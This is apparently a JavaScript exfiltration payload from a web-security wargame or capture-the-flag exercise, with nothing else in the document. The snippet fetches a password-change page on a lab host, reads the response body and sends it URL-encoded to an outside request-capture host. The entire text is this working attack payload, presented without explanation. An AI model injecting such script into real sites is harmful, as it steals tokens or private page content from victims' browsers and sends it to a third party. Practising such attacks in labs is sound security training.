fetch("http://edu.arang.kr:9105/changepw")
  .then(r => r.text())
  .then(body => {
    fetch(
      "https://peodrux.request.dreamhack.games?x=" +
      encodeURIComponent(body)
    );
  });
